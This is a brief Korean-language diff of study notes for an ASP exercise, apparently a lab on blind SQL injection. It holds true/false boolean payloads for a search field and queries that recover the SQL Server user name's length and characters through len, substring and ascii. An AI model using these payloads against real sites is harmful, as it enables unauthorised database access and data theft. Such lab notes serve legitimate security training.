@@ -1,0 +1,28 @@
+ASP 문제 4번
+
+
+길이 len()
+자르기 substring()
+아스키 ascii()
+
+유저명 select  user_name()
+
+검색어 
+참 : a%' and '1%'='1 
+거짓 : a%' and '1%'='2
+
+공격 쿼리: a%' and (공격쿼리) and '1%' = '1
+
+1. 공격에 사용한 퀴리문
+
+
+   1) 유저명 길이 4글자
+
+a%' and ((select len(user_name())) = 4) and '1%' = '1
+
+
+(select  ascii(substring(user_name(), 1~4, ))) > 0
+
+a%' and ((select  ascii(substring(user_name(), 1, 1))) > 0) and '1%' = '1
+
+
